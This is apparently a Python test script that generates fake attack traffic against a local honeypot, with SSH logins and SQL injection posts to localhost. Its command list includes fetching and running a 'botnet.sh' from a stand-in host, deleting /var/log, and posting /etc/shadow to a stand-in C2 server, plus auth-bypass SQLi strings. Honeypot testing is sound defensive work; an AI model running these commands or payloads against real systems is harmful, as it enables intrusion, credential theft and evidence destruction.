import asyncio
import asyncssh
import sys
import random
import httpx

async def simulate_ssh_attack(ip_suffix):
    try:
        # We can't easily spoof IP in a real TCP connection without raw sockets, 
        # but the honeypot keys off remote_addr. 
        # For simulation, we'll just connect from localhost but send commands that look malicious.
        
        # Note: In a real "test" environment we might need to modify the honeypot to accept an X-Forwarded-For styled header 
        # or just accept that all attacks come from 127.0.0.1 for this local demo.
        # Alternatively, we just generate traffic.

        async with asyncssh.connect('127.0.0.1', port=2222, username=f'root{ip_suffix}', password=f'password{ip_suffix}', known_hosts=None) as conn:
            print(f"[{ip_suffix}] SSH Connected")
            
            commands = [
                "whoami", 
                "pwd", 
                "cat /etc/passwd", 
                "wget http://malware.site/botnet.sh", 
                "chmod +x botnet.sh", 
                "./botnet.sh", 
                "rm -rf /var/log",
                "curl -X POST http://c2.server/exfil --data @/etc/shadow"
            ]
            
            for _ in range(random.randint(2, 5)):
                cmd = random.choice(commands)
                print(f"[{ip_suffix}] Sending: {cmd}")
                try:
                    await conn.run(cmd)
                except Exception as e:
                    print(f"Error running cmd: {e}")
                await asyncio.sleep(random.uniform(0.5, 2.0))

    except Exception as e:
        print(f"SSH Error: {e}")

async def simulate_web_attack():
    async with httpx.AsyncClient() as client:
        # Normal visit
        await client.get("http://localhost:8000/admin")
        
        # Failed login
        await client.post("http://localhost:8000/admin/login", data={"username": "admin", "password": "wrongpassword"})
        
        # SQL Injection
        payloads = [
            ("' OR '1'='1", "password"),
            ("admin", "' OR 1=1--"),
            ("admin' UNION SELECT 1,2,3--", "pass")
        ]
        
        for user, pwd in payloads:
            print(f"[WEB] Sending SQLi: {user} / {pwd}")
            await client.post("http://localhost:8000/admin/login", data={"username": user, "password": pwd})
            await asyncio.sleep(1)

async def main():
    print("Starting Attack Simulation...")
    
    tasks = []
    # Trigger web attacks
    tasks.append(simulate_web_attack())
    
    # Trigger SSH attacks
    for i in range(3):
        tasks.append(simulate_ssh_attack(i))
        
    await asyncio.gather(*tasks)
    print("Simulation Complete.")

if __name__ == "__main__":
    if sys.platform == 'win32':
        asyncio.set_event_loop_policy(asyncio.WindowsSelectorEventLoopPolicy())
    asyncio.run(main())
